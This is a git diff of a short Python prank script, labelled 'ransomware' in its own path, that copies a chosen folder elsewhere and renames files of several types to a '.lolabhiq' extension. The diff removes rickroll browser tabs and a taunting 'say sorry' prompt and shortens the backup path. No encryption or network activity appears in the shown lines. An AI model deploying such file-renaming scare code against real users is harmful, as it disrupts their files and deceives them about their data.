@@ -8,12 +8,9 @@ import shutil
 os.system("color 0a")
 os.system("cls")
 folder = input("Enter The Location \n ")
-webbrowser.open_new("https://github.com/abhinav-ranish")
-webbrowser.open_new_tab("https://www.youtube.com/watch?v=LWz4Zk-0B9w")
-webbrowser.open_new_tab("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
 
 
-files = "D:/abhinavranishgq/githubprohackingskills/pog/ransomware/files/copiedfiles/justmakethisdirectoryaslongaspossible/ok/files"
+files = "D:/x/x/x/x/x/x/x/x/files"
 shutil.copytree(folder, files , dirs_exist_ok=True)
 
 for filename in glob.iglob(os.path.join(folder, '*.exe')):
@@ -70,13 +67,5 @@ for filename in glob.iglob(os.path.join(folder, '*.xlsx')):
     os.rename(filename, filename[:-4] + ".lolabhiq")
 
 
-print("Check Your Folder :)")
-pog = input("Say Sorry lmao\n")
-if pog == "Sorry" or "Soewwy" or "Sory" or "Sorrrry" or ":(" or "Sowwy":
-    print("Okie. Next time be carefull")
-    print("Your Files are located at " + files)
-else :
-    print("Your Trash. Im Toxic :)")
-    
-op =  input("Click Enter to close\n")
+input("Click Enter to close\n")
 os.system("cls")
